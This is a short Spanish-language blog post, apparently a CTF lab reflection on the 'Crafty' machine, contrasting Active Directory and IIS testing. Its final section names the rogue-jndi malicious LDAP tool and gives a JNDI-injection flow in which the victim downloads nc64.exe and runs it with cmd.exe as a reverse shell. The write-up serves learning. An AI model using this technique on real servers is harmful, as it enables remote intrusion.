---
title: "AD vs IIS"
description: "Windows AD vs Windows IIS"
date: "2026-01-03"
banner:
  src: "../../images/ad-vs-iis.jpg"
  alt: "Two Kings of chess, white & black"
  caption: 'Photo by <a href="https://unsplash.com/@rn2917">Unsplash</a>'
categories:
  - "IIS"
  - "AD"
keywords:
  - "Active Directory"
  - "Internet Information Services"
---

# Que aprendi de la maquina Crafty

Si comparamos las maquinas Cicada y Crafty vemos que ambas pertenecen al entorno Windows, pero con una grandisima diferencia: AD vs IIS.

Quiza porque sean ambas faciles podemos ver una diferencia clara, en el entorno AD testeamos la red y los privilegios, moviendonos por distintos servicios y usuarios con distintas responsabilidades. En el entorno IIS vemos similitudes con Privesc en Linux, es decir, a groso modo, un servidor y un binario inseguro.

Desde este punto de vista puedo trazar una distinsion clara entre testear AD y IIS si bien ambos son Windows, si bien son solo dos ejemplos, tiene sentido pensar que al enfrentar un AD se testee lo que en esencia es AD, redes, servicios y contenido distribuido. Y de ahi, que cambiemos el mindset cuando nos enfrentemos a algo que no es AD.

Entonces, siguiendo esta vision, tiene sentido que pensemos en testear un servidor cuando nos enfrentamos a IIS, ya que eso es (y lo pienso de este modo quiza por deformacion al entender el mundo desde Linux). IIS si bien es Windows al igual que AD, y claro puede tener las mismas vias, cumple funciones muy diferentes y vistolo asi, el testeo es mas a nivel sistema que nivel red.

> Y todo esto lo pense mientras le daba la tabarra a una persona que no le interesaba la ciber seguridad...


## A malicious LDAP server for JNDI injection attacks

> https://github.com/veracode-research/rogue-jndi


En esta maquina vemos una variante de una tecnica comun en Linux, montar un servidor malicioso para redireccionar hacia un recurso malicioso (un reverse shell en este caso) una peticion realizada por un servidor legitimo.

En este lab, un IIS levanta un servidor de Minecraft al que forzamos a realizar una peticion a nuestro servidor LDAP (ya que nos encontramos en un entorno Windows).

El flow fue asi:
* `Victim Server --> Evil LDAP --> http.server & -o C:\Windows\Temp\nc64.exe -e cmd.exe attr_addr`